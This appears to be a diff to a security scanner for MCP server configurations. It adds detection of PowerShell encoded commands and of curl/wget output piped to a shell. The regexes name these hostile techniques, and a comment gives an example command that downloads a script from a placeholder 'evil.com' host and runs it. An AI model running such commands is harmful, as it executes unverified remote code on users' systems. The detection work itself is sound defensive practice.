@@ -1,4 +1,5 @@
 import re
+import base64
 from ..models import Finding, Severity, OWASPCategory
 from ..parser import MCPServer
 
@@ -17,6 +18,20 @@ _INLINE_EXEC_PATTERNS: list[tuple[re.Pattern, str]] = [
     (re.compile(r'Runtime\.getRuntime\(\)\.exec\s*\('), "Java Runtime.exec() call"),
     (re.compile(r'Process\s*\(\s*["\']'), "Python Process() execution"),
 ]
+
+# EX-003: PowerShell encoded command (universally malicious in MCP configs)
+# -EncodedCommand BASE64 / -e BASE64 / -ec BASE64 — hides arbitrary PowerShell payload from detection.
+# No legitimate MCP server uses this technique.
+_PS_ENCODED_CMD_FLAGS = re.compile(
+    r'(?i)-(?:EncodedCommand|ec|e|en|enc|enco|encod)\b',
+)
+_BASE64_PAYLOAD_RE = re.compile(r'^[A-Za-z0-9+/]{20,}={0,2}$')
+
+# EX-003: Remote script download-and-execute (curl/wget pipe to shell)
+# e.g. "curl https://evil.com/install.sh | bash" — downloads and executes without verification
+_CURL_PIPE_SHELL_RE = re.compile(
+    r'(?i)(curl|wget)\s+.*?\|\s*(bash|sh|python|python3|node|perl|ruby)\b'
+)
 
 # EX-002: Command substitution / injection in argument strings
 _CMD_SUBSTITUTION_PATTERNS: list[tuple[re.Pattern, str]] = [
@@ -95,5 +110,78 @@ def check_code_execution(server: MCPServer) -> list[Finding]:
                         engine="custom",
                     ))
                 break
+
+    # EX-003a: PowerShell encoded command in args
+    # Pattern: [..., "-EncodedCommand", "BASE64PAYLOAD", ...] or [..., "-e", "BASE64", ...]
+    # The flag and payload may be in adjacent args or combined (--flag=payload).
+    ps_flag_idx: int | None = None
+    for i, arg in enumerate(server.args):
+        if _PS_ENCODED_CMD_FLAGS.fullmatch(arg.strip()):
+            ps_flag_idx = i
+        elif ps_flag_idx is not None and _BASE64_PAYLOAD_RE.match(arg.strip()):
+            # Try to decode the payload to include a preview in the finding
+            try:
+                decoded = base64.b64decode(arg.strip()).decode("utf-16-le", errors="replace")[:80]
+            except Exception:
+                decoded = arg[:80]
+            key = f"EX-003:ps:{server.name}"
+            if key not in seen:
+                seen.add(key)
+                findings.append(Finding(
+                    check_id="EX-003",
+                    title="PowerShell encoded command detected (obfuscated payload)",
+                    detail=(
+                        f"Server `{server.name}` uses a PowerShell `-EncodedCommand` (or equivalent) flag "
+                        f"in argument #{ps_flag_idx+1}, followed by a Base64 payload in argument #{i+1}. "
+                        f"Decoded preview: `{decoded!r}`. "
+                        "Base64-encoded PowerShell is the most common technique for hiding malicious "
+                        "commands from static detection. No legitimate MCP server requires this pattern."
+                    ),
+                    severity=Severity.CRITICAL,
+                    owasp=OWASPCategory.MCP05,
+                    server_name=server.name,
+                    remediation=(
+                        "Immediately remove this server from your config. "
+                        "Decode the Base64 payload to understand what it executes, then investigate "
+                        "how the server was installed. Report to the package maintainer if it was installed "
+                        "from a registry."
+                    ),
+                    engine="custom",
+                    attack_tactic="defense-evasion",
+                    cwe_id="CWE-116",
+                ))
+            break
+        else:
+            ps_flag_idx = None  # reset if payload not immediately following
+
+    # EX-003b: curl/wget pipe to shell in any arg (supply chain download-and-execute)
+    full_args_joined = " ".join(server.args)
+    match = _CURL_PIPE_SHELL_RE.search(full_args_joined)
+    if match:
+        key = f"EX-003:curl:{server.name}"
+        if key not in seen:
+            seen.add(key)
+            findings.append(Finding(
+                check_id="EX-003",
+                title="Remote script download-and-execute (curl/wget pipe to shell)",
+                detail=(
+                    f"Server `{server.name}` appears to download and immediately execute a remote script: "
+                    f"`{match.group(0)!r}`. "
+                    "curl/wget piped to bash/sh/python fetches arbitrary code from a remote URL "
+                    "and executes it in one step, with no verification or review. "
+                    "This is one of the most common supply chain attack techniques."
+                ),
+                severity=Severity.CRITICAL,
+                owasp=OWASPCategory.MCP05,
+                server_name=server.name,
+                remediation=(
+                    "Download the script first, inspect its contents, then execute it manually. "
+                    "Never pipe a remote URL directly into a shell interpreter. "
+                    "Verify the script's integrity with a checksum before running."
+                ),
+                engine="custom",
+                attack_tactic="execution",
+                cwe_id="CWE-494",
+            ))
 
     return findings
